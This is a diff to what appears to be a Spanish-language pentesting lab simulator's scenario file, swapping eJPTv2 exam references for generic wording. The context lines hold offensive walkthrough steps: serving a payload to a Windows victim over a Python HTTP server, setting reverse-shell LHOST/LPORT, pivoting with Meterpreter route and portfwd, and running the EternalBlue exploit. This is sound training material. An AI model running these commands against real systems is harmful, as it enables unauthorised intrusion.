@@ -67,7 +67,7 @@ export const SCENARIOS: ScenarioConfig[] = [
         stepNumber: 1,
         title: 'Identificar la dirección IP del atacante',
         description: 'Comprueba tu IP en la interfaz puente de Kali Linux para saber qué dirección configurar en el payload de Metasploit.',
-        whyInExam: 'En el examen eJPTv2 debes verificar qué interfaz conecta con el laboratorio antes de generar cualquier reverse shell o configurar LHOST.',
+        whyInExam: 'En un examen práctico de pentesting debes verificar qué interfaz conecta con el laboratorio antes de generar cualquier reverse shell o configurar LHOST.',
         hint: 'Ejecuta `hostname -I` o `ifconfig eth0`',
         expectedCommands: ['hostname -I', 'hostname -i', 'ifconfig', 'ip a', 'ip addr'],
       },
@@ -88,7 +88,7 @@ export const SCENARIOS: ScenarioConfig[] = [
         stepNumber: 3,
         title: 'Servir el payload vía servidor web Python',
         description: 'Inicia un servidor HTTP en el puerto 5000 para permitir que la máquina Windows descargue el payload.',
-        whyInExam: 'Python http.server es la forma más rápida y estándar en eJPTv2 para transferir binarios y herramientas a la máquina víctima.',
+        whyInExam: 'Python http.server es la forma más rápida y estándar para transferir binarios y herramientas a la máquina víctima en un pentest real.',
         hint: 'python3 -m http.server 5000',
         expectedCommands: [
           'python3 -m http.server 5000',
@@ -171,7 +171,7 @@ export const SCENARIOS: ScenarioConfig[] = [
       'Domina el enrutamiento interno de Metasploit mediante `route add <red> <máscara> <sesión>` y el comando nativo de Meterpreter `portfwd add` para extraer servicios HTTP y FTP de una máquina Metasploitable 2 aislada.',
     topologySummary: 'Kali (192.168.1.100) -> Ubuntu Intermedio (192.168.1.45 / 10.10.10.3) -> Metasploitable 2 (10.10.10.5)',
     isolatedSubnet: '10.10.10.0/24',
-    successFlagMessage: '¡Servicios HTTP y FTP alcanzados con éxito a través del túnel Meterpreter! eJPTv2 skill validada.',
+    successFlagMessage: '¡Servicios HTTP y FTP alcanzados con éxito a través del túnel Meterpreter! Técnica de pivoting validada.',
     machines: [
       {
         id: 'kali',
@@ -269,7 +269,7 @@ export const SCENARIOS: ScenarioConfig[] = [
         stepNumber: 5,
         title: 'Traer el puerto HTTP (80) localmente con portfwd',
         description: 'Vuelve a entrar a la sesión 2 (sessions -i 2) y utiliza portfwd para redirigir el puerto local 5000 de Kali hacia el puerto 80 de Metasploitable 2 (10.10.10.5).',
-        whyInExam: '`portfwd add -l <local_port> -p <target_port> -r <target_ip>` es la sintaxis dorada del examen eJPTv2 para traer servicios web a localhost.',
+        whyInExam: '`portfwd add -l <local_port> -p <target_port> -r <target_ip>` es la sintaxis dorada de cualquier examen práctico de pentesting para traer servicios web a localhost.',
         hint: 'sessions -i 2 -> portfwd add -l 5000 -p 80 -r 10.10.10.5',
         expectedCommands: [
           'portfwd add -l 5000 -p 80 -r 10.10.10.5',
@@ -455,7 +455,7 @@ export const SCENARIOS: ScenarioConfig[] = [
         stepNumber: 6,
         title: 'Explotar la máquina objetivo final cambiando LPORT',
         description: 'Vuelve a usar exploit/windows/smb/ms17_010_eternalblue apuntando a RHOSTS 192.168.1.60, RPORT 5000 y cambiando obligatoriamente LPORT a 5555 para evitar colisiones con el puerto 4444 de la sesión 1.',
-        whyInExam: 'Regla de oro del eJPTv2: Al lanzar una segunda sesión reversa hacia la misma IP de Kali, DEBES cambiar LPORT (ej. 5555) porque 4444 ya está en uso por la primera sesión.',
+        whyInExam: 'Regla de oro del pivoting: al lanzar una segunda sesión reversa hacia la misma IP de Kali, DEBES cambiar LPORT (ej. 5555) porque 4444 ya está en uso por la primera sesión.',
         hint: 'use exploit/windows/smb/ms17_010_eternalblue -> set RHOSTS 192.168.1.60 -> set RPORT 5000 -> set LPORT 5555 -> run',
         expectedCommands: ['run', 'exploit'],
         autoActionOnSuccess: {
